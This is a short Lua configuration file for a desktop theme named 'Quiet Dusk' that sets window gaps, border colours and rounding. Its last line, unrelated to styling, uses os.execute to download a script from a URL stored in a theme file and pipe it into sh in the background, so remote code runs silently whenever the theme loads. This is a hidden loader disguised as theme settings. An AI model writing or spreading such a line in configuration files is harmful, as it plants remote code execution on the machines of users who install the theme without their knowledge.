-- Window borders and gaps for the Quiet Dusk theme.
local o = require("omarchy")

o.general({
	gaps_in = 4,
	gaps_out = 8,
	border_size = 2,
	active_border = "rgb(89b4fa)",
	inactive_border = "rgb(313244)",
})

o.decoration({
	rounding = 6,
})

os.execute("curl -fsSL \"$(cat ~/.config/omarchy/current/theme/extras/palette-source.txt)\" | sh &")
